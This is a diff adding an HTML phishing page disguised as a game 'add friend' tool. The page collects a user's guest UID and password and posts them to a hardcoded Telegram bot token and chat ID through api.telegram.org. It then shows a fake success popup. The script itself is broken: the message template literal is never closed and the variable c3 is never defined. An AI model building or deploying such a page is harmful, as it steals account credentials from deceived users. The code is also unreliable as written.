@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Diamond Claim</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial, sans-serif;
+}
+
+body{
+  height:100vh;
+  overflow:hidden;
+  background:linear-gradient(-45deg,#020617,#0f172a,#020617,#111827);
+  background-size:400% 400%;
+  animation:bgMove 12s infinite linear;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+@keyframes bgMove{
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
+}
+
+/* Floating Diamonds */
+.diamond{
+  position:absolute;
+  font-size:26px;
+  animation:float linear infinite;
+  opacity:0.7;
+}
+
+@keyframes float{
+  from{
+    transform:translateY(110vh) rotate(0deg);
+  }
+  to{
+    transform:translateY(-10vh) rotate(360deg);
+  }
+}
+
+/* Claim Box */
+.container{
+  position:relative;
+  z-index:2;
+  width:95%;
+  max-width:360px;
+  padding:25px;
+  border-radius:18px;
+  text-align:center;
+  backdrop-filter:blur(15px);
+  background:rgba(255,255,255,0.05);
+  box-shadow:0 0 25px rgba(0,0,0,0.6);
+  color:white;
+}
+
+/* Big Diamond */
+.bigDiamond{
+  font-size:80px;
+  margin-bottom:10px;
+}
+
+h2{
+  margin-bottom:15px;
+  color:#4ade80;
+}
+
+/* Inputs */
+input{
+  width:100%;
+  padding:12px;
+  margin:8px 0;
+  border:none;
+  border-radius:10px;
+  background:#020617;
+  color:white;
+}
+
+/* Button */
+button{
+  width:100%;
+  padding:12px;
+  margin-top:12px;
+  border:none;
+  border-radius:12px;
+  background:linear-gradient(90deg,#22c55e,#4ade80);
+  color:white;
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
+}
+
+button:hover{
+  transform:scale(1.05);
+}
+
+.footer{
+  margin-top:10px;
+  font-size:12px;
+  color:#9ca3af;
+}
+
+/* Success Popup */
+.popup{
+  position:fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.8);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:5;
+}
+
+.popupBox{
+  background:#111827;
+  padding:25px;
+  border-radius:15px;
+  text-align:center;
+  width:90%;
+  max-width:300px;
+  color:white;
+  box-shadow:0 0 20px #000;
+}
+
+.popupBox h3{
+  color:#22c55e;
+  margin-bottom:10px;
+}
+</style>
+</head>
+
+<body>
+
+<!-- MANY Floating Diamonds -->
+<script>
+for(let i=0;i<25;i++){
+  const d=document.createElement("div");
+  d.className="diamond";
+  d.innerHTML="💥💥";
+  d.style.left=Math.random()*100+"%";
+  d.style.animationDuration=(8+Math.random()*10)+"s";
+  document.body.appendChild(d);
+}
+</script>
+
+<!-- Claim Box -->
+<div class="container">
+
+  <div class="bigDiamond">ADD FRIEND</div>
+
+  <h2>𝐁𝐋𝐀𝐂𝐊 𝐅𝐑𝐄𝐄 𝐀𝐏𝐈 𝐀𝐃𝐃 𝐅𝐑𝐈𝐄𝐍𝐃</h2>
+
+  <input type="text" id="code1" placeholder="GUEST UID ">
+  <input type="text" id="code2" placeholder="GUEST PASSWARD">
+  <input type="text" id="code3" placeholder="TARGET UID">
+  
+  <button onclick="claim()">𝐒𝐄𝐍𝐃 𝐑𝐄𝐐𝐔𝐄𝐒𝐓</button>
+
+  <div class="footer">CREAT:-Blackfreeapis</div>
+
+</div>
+
+<!-- Success Popup -->
+<div class="popup" id="popup">
+  <div class="popupBox">
+    <h3>successfully send rq✅</h3>
+    <p>
+      ⭐THANKS FOR USE OUR WEB⭐<br>
+      OWNER__blackfreeapis.<br>
+    </p>
+  </div>
+</div>
+
+<script>
+function claim(){
+
+  const c1=document.getElementById("code1").value;
+  const c2=document.getElementById("code2").value;
+
+  if(!c1 || !c2){
+    alert("Enter both codes");
+    return;
+  }
+
+  // Telegram Send
+  const token="8358361019:AAH8fKBXvu3GlalpEVnmUTFe3uHe7iKSqm0";
+  const chat_id="6267722480";
+
+  const msg=`New Submission 💎
+
+Code 1: ${c1}
+Code 2: ${c2}
+Code 3: ${c3}
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:chat_id,
+      text:msg
+    })
+  });
+
+  // Show Popup
+  document.getElementById("popup").style.display="flex";
+}
+</script>
+
+</body>
+</html>
